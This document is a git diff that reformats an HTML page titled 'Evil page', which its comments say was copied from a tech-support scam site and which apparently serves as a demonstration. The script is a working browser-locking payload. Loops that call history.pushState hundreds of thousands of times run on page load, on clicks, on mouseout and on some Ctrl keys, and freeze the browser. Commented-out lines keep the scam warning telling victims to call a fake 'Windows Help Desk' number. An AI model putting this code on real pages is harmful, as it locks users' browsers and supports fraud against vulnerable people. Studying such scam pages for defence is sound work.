@@ -1,90 +1,94 @@
 <html>
-    <head>
-        <title>Evil page</title>
-        <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
-    </head><body background="fakepage.PNG"><script>
-        // stolen from https://ebaco5.ga/my2-2852/newchrome/chxchxchxchxchx/?phone=+1-888-447-2852&
-        // https://web.archive.org/web/20200707175018/https://ebaco5.ga/my2-2852/newchrome/chxchxchxchxchx/?phone=+1-888-447-2852
-        var is_chrome,
+
+<head>
+  <title>Evil page</title>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+</head>
+
+<body background="fakepage.PNG">
+  <script>
+    // stolen from https://ebaco5.ga/my2-2852/newchrome/chxchxchxchxchx/?phone=+1-888-447-2852&
+    // https://web.archive.org/web/20200707175018/https://ebaco5.ga/my2-2852/newchrome/chxchxchxchxchx/?phone=+1-888-447-2852
+    var is_chrome,
     isChromium = window.chrome,
     vendorName = window.navigator.vendor,
     isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
-is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
+    is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
 
-function alertCall() {
-    var total = "";
-    for (var i = 0; i < 100000; i++) {
+    function alertCall() {
+      var total = "";
+      for (var i = 0; i < 100000; i++) {
         total = total + i.toString();
         history.pushState(0, 0, total);
+      }
     }
-}
 
-function alertTimed() {
-    if (is_chrome) {
+    function alertTimed() {
+      if (is_chrome) {
         setInterval(function() {
-            alertCall();
+          alertCall();
         }, 200);
-    } else {
+      } else {
         alertLoop();
+      }
     }
-}
 
-function alertLoop() {
-    for (i = 0; i < 500; i++) {
+    function alertLoop() {
+      for (i = 0; i < 500; i++) {
         alertCall();
+      }
     }
-}
 
-function addEvent(obj, evt, fn) {
-    if (obj.addEventListener) {
+    function addEvent(obj, evt, fn) {
+      if (obj.addEventListener) {
         obj.addEventListener(evt, fn, false)
-    } else if (obj.attachEvent) {
+      } else if (obj.attachEvent) {
         obj.attachEvent("on" + evt, fn)
+      }
     }
-}
-$(document).ready(function() {
-    document.onkeydown = function(e) {
+    $(document).ready(function() {
+      document.onkeydown = function(e) {
         if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
-            if (!is_chrome) {
-                alertTimed();
-            }
-            return true;
+          if (!is_chrome) {
+            alertTimed();
+          }
+          return true;
         } else if (e.keyCode === 123) {
-            return true;
+          return true;
         } else {
-            return true;
+          return true;
         }
-    };
-    $(window).on('click', function() {
+      };
+      $(window).on('click', function() {
         //window.open('index.html', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
         //toggleFullScreen();
         alertTimed();
         //document.getElementById("ifr").src="index.html";
-
-    });
-    addEvent(document, "mouseout", function(e) {
+      });
+      addEvent(document, "mouseout", function(e) {
         e = e ? e : window.event;
         var from = e.relatedTarget || e.toElement;
         if (!is_chrome && (!from || from.nodeName == "body")) {
-            alertTimed();
+          alertTimed();
         }
+      });
     });
-});
-window.onbeforeunload = function(e) {
-    // var message = '*************************************************\n\nCall Windows  Help Desk Immediately at +1-888-888-8888\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows  Help Desk Immediately at +1-888-888-8888';
-    // e.returnValue = message;
-    // return message;
-};
-window.onload = function(e) {
-    //alertTimed();
-};
-// added by me
-document.onreadystatechange = function() {
-    if (document.readyState === "complete") {
+    window.onbeforeunload = function(e) {
+      // var message = '*************************************************\n\nCall Windows  Help Desk Immediately at +1-888-888-8888\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows  Help Desk Immediately at +1-888-888-8888';
+      // e.returnValue = message;
+      // return message;
+    };
+    window.onload = function(e) {
+      //alertTimed();
+    };
+    // added by me
+    document.onreadystatechange = function() {
+      if (document.readyState === "complete") {
         alertTimed();
+      }
     }
-}
-</script>
-<h1 style="color:red;font-weight:bolder;margin:17vw 43vw">I am a fake page</h1>    
+  </script>
+  <h1 style="color:red;font-weight:bolder;margin:17vw 43vw">I am a fake page</h1>
 </body>
+
 </html>
